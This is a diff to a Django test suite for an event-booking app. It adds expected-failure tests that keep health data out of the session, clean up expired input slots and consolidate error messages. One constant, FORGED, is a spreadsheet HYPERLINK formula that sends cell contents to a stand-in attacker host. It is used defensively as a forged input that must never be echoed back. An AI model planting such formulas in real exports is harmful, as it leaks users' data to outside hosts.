@@ -11,6 +11,7 @@
 
 import pathlib
 import re
+import time
 import uuid
 from datetime import timedelta
 from unittest import mock
@@ -23,6 +24,7 @@ from django.contrib.messages.middleware import MessageMiddleware
 from django.contrib.sessions.middleware import SessionMiddleware
 from django.test import RequestFactory
 from django.utils import timezone, translation
+from django.utils.translation import ngettext
 
 from apps.events import participants, public_views, registration, views
 from apps.events.models import Event, Ticket, TicketParticipant
@@ -33,6 +35,15 @@ from apps.tenants.tests.factories import TenantFactory
 pytestmark = pytest.mark.django_db
 
 MSG_DE = "Bitte bei „%(field)s“ einen Eintrag aus der Liste wählen."
+XF = pytest.mark.xfail(strict=True, reason="FB-33 D6 ревью §10.5: до правки")
+
+
+def _summary(n):
+    return ngettext("Bitte %(n)s Angabe korrigieren.", "Bitte %(n)s Angaben korrigieren.", n) % {
+        "n": n
+    }
+
+
 FORGED = '=HYPERLINK("http://evil.example/?x="&A1,"Klick")'
 LOCALES = ["de", "en", "tr", "ru", "uk"]
 
@@ -64,6 +75,8 @@ def _req(method="post", data=None, session_from=None):
     if session_from is not None:
         request.session = session_from.session
         request._messages = session_from._messages
+        # браузер гостя, у которого уже есть сессия, шлёт её cookie
+        request.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
     request.tenant = getattr(session_from, "tenant", None) or TenantFactory.build()
     return request
 
@@ -106,6 +119,7 @@ GOOD = {
 
 
 # --- №6 / №7: подделка select на брони ---------------------------------------------
+@XF
 def test_invalid_select_no_ticket_input_kept():
     """Подделанный вариант: билета нет, сообщение с подписью поля, введённое — в форме."""
     event = _event()
@@ -113,13 +127,14 @@ def test_invalid_select_no_ticket_input_kept():
     assert resp.status_code == 302
     assert not Ticket.objects.filter(event=event).exists()
     texts = [str(m) for m in get_messages(request)]
-    assert MSG_DE % {"field": "Ernährung"} in texts
+    assert texts == [_summary(1)]
     _resp, html = _detail(event, session_from=request)
     form = _form(html)
     assert 'value="Anna Gast"' in form and 'value="anna@gast.de"' in form
     assert 'value="0170 123"' in form and 'value="2"' in form
     assert 'value="Bahn"' in form and 'value="Österreich"' in form
-    assert ">Rücken</textarea>" in form
+    # Art. 9 (здоровье) в сессию не кладётся — гость вводит заново
+    assert "Rücken" not in html
     assert '<option value="Mittel" selected>' in _select(form, "reg_experience")
     # подделанное значение не возвращается ни вариантом, ни текстом
     assert "HYPERLINK" not in html and "evil.example" not in html
@@ -328,7 +343,7 @@ def test_participants_invalid_select_nothing_saved(page):
         req, resp = _cabinet_post(ticket, post)
         assert resp.status_code == 302
         texts = [str(m) for m in get_messages(req)]
-        assert MSG_DE % {"field": "Ernährung"} in texts
+        assert any(MSG_DE % {"field": "Ernährung"} in t for t in texts)
         assert "Teilnehmerdaten gespeichert." not in texts
     rows = {
         p.position: (p.name, p.answers) for p in TicketParticipant.objects.filter(ticket=ticket)
@@ -462,3 +477,189 @@ def test_d6_msgids_in_all_po(lang):
     assert len(hits) == 1, lang
     assert hits[0].msgstr and not hits[0].fuzzy
     assert "%(field)s" in hits[0].msgstr
+
+
+# --- ревью диффа D6 (план §10.5) ---------------------------------------------------
+@XF
+def test_event_input_slot_excludes_medical():
+    """Art. 9: здоровье, аллергии, экстренный контакт, дата рождения — не в слот сессии."""
+    event = _event(
+        registration_fields=[
+            "country",
+            "diet",
+            "medical",
+            "allergies",
+            "emergency_contact",
+            "birth_date",
+        ]
+    )
+    post = {
+        **GOOD,
+        "reg_diet": "Paleo",
+        "reg_allergies": "Nüsse",
+        "reg_emergency_contact": "Mama 0170",
+        "reg_birth_date": "1990-01-01",
+    }
+    request, _resp = _book(event, post)
+    reg = request.session[public_views.EVENT_INPUT_KEY]["data"]["reg"]
+    assert reg == {"country": "Österreich"}
+    assert set(registration.NO_ECHO_KEYS) == {
+        "medical",
+        "allergies",
+        "emergency_contact",
+        "birth_date",
+    }
+    _r, html = _detail(event, session_from=request)
+    for value in ("Rücken", "Nüsse", "Mama 0170", "1990-01-01"):
+        assert value not in html
+
+
+@XF
+def test_event_input_expired_slot_removed_on_foreign_event():
+    event, other = _event(), _event(title="Anderes")
+    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
+    slot = request.session[public_views.EVENT_INPUT_KEY]
+    slot["ts"] -= public_views.EVENT_INPUT_TTL + 1
+    request.session[public_views.EVENT_INPUT_KEY] = slot
+    _detail(other, session_from=request)
+    assert public_views.EVENT_INPUT_KEY not in request.session
+
+
+@XF
+def test_no_session_read_without_cookie():
+    """Без cookie сессии слот не читается — страница события не получает `Vary: Cookie`
+    из-за D6."""
+    event = _event()
+    request = _req("get")
+    with mock.patch.object(public_views, "_take_event_input", wraps=public_views._take_event_input):
+        public_views.veranstaltung_detail(request, pk=event.pk)
+    assert not request.session.accessed
+
+
+class _BrokenSession(dict):
+    def __setitem__(self, key, value):
+        raise RuntimeError("session store down")
+
+
+@XF
+def test_session_write_failure_logged(caplog):
+    event = _event()
+    request = _req("post", {**GOOD, "reg_diet": "Paleo"})
+    request.session = _BrokenSession()
+    with caplog.at_level("WARNING", logger="apps.events.public_views"):
+        resp = public_views.veranstaltung_book(request, pk=event.pk)
+    assert resp.status_code == 302
+    assert not Ticket.objects.filter(event=event).exists()
+    hits = [r for r in caplog.records if r.levelname == "WARNING" and r.exc_info]
+    assert hits and "event input" in hits[0].getMessage()
+
+
+@XF
+def test_one_summary_message_and_field_texts():
+    """Одна ошибка — одно объявление: одно сводное сообщение, подробность — у полей; на
+    странице сводка ровно один раз (локальный цикл сообщений карточки снят)."""
+    event = _event()
+    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo", "reg_experience": "Profi"})
+    carrier = _req("get")
+    carrier.session, carrier.tenant = request.session, request.tenant
+    carrier.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
+    carrier._messages = request._messages
+    _r, html = _detail(event, session_from=carrier)
+    assert html.count(_summary(2)) == 1
+    assert 'id="reg_diet-error"' in html and 'id="reg_experience-error"' in html
+    assert html.count(MSG_DE % {"field": "Ernährung"}) == 1  # только у поля
+
+
+@XF
+def test_guest_one_summary_message():
+    ticket = _ticket(_event(registration_fields=["diet"]))
+    resp = _guest_post(ticket, {"p1_name": "A", "p2_name": "B", "p2_reg_diet": "Paleo"})
+    html = resp.content.decode()
+    assert html.count(_summary(1)) == 1
+    assert html.count(MSG_DE % {"field": "Ernährung"}) == 1
+
+
+@XF
+def test_event_input_restores_tier_and_extras():
+    from apps.core.models import Extra
+
+    event = _event(
+        tiers=[
+            {"label": "Frühbucher", "price_cents": 0},
+            {"label": "Standard", "price_cents": 0},
+        ]
+    )
+    extra = Extra.objects.create(scope=Extra.SCOPE_EVENTS, label="Bio-Mittag", price_cents=0)
+    post = {
+        **GOOD,
+        "reg_diet": "Paleo",
+        "tier": "Standard",
+        "extra": [str(extra.pk), "fremd"],
+        "voucher_code": "GS-ABC",
+        "waiver_name": "Anna Gast",
+    }
+    request, _resp = _book(event, post)
+    data = request.session[public_views.EVENT_INPUT_KEY]["data"]
+    assert data["tier"] == "Standard" and data["extras"] == [str(extra.pk)]
+    assert "voucher_code" not in data and "waiver_name" not in data
+    _r, html = _detail(event, session_from=request)
+    form = _form(html)
+    assert re.search(r'name="tier" value="Standard"[^>]*checked', form)
+    assert not re.search(r'name="tier" value="Frühbucher"[^>]*checked', form)
+    assert re.search(rf'name="extra" value="{extra.pk}"[^>]*checked', form)
+    assert "GS-ABC" not in form
+
+
+@XF
+def test_event_input_unknown_tier_not_kept():
+    event = _event(tiers=[{"label": "Standard", "price_cents": 0}])
+    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo", "tier": "Erfunden"})
+    assert request.session[public_views.EVENT_INPUT_KEY]["data"]["tier"] == ""
+
+
+@XF
+def test_all_field_types_described_and_one_autofocus():
+    """`aria-invalid`/`aria-describedby` и рамка — у поля с ошибкой любого типа;
+    `autofocus` — только у первого."""
+    event = _event()
+    request = _req("get")
+    request.session[public_views.EVENT_INPUT_KEY] = {
+        "pk": str(event.pk),
+        "data": {"name": "A", "errors": ["country", "diet", "medical"]},
+        "ts": int(time.time()),
+    }
+    request.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
+    _r, html = _detail(event, session_from=request)
+    form = _form(html)
+    for name, tag in (
+        ("reg_country", "input"),
+        ("reg_diet", "select"),
+        ("reg_medical", "textarea"),
+    ):
+        el = re.search(rf'<{tag} name="{name}"[^>]*>', form).group(0)
+        assert 'aria-invalid="true"' in el and f'aria-describedby="{name}-error"' in el, name
+        assert "border-red-600" in el, name
+    assert form.count("autofocus") == 1
+    assert re.search(r'<input name="reg_country"[^>]*autofocus', form)
+
+
+@XF
+def test_cabinet_message_names_position():
+    ticket = _ticket(_event(registration_fields=["diet"]), quantity=3)
+    req, _resp = _cabinet_post(
+        ticket, {"p1_name": "A", "p2_name": "B", "p2_reg_diet": "Paleo", "p3_name": "C"}
+    )
+    texts = [str(m) for m in get_messages(req)]
+    assert len(texts) == 1 and "Person 2" in texts[0] and "Ernährung" in texts[0]
+    assert not TicketParticipant.objects.filter(ticket=ticket).exists()
+
+
+@XF
+@pytest.mark.parametrize("lang", LOCALES)
+def test_d6_summary_msgid_in_all_po(lang):
+    path = pathlib.Path(settings.BASE_DIR) / "locale" / lang / "LC_MESSAGES" / "django.po"
+    po = polib.pofile(str(path))
+    hits = [e for e in po if e.msgid == "Bitte %(n)s Angabe korrigieren." and not e.obsolete]
+    assert len(hits) == 1, lang
+    assert hits[0].msgid_plural == "Bitte %(n)s Angaben korrigieren."
+    assert all(v for v in hits[0].msgstr_plural.values())
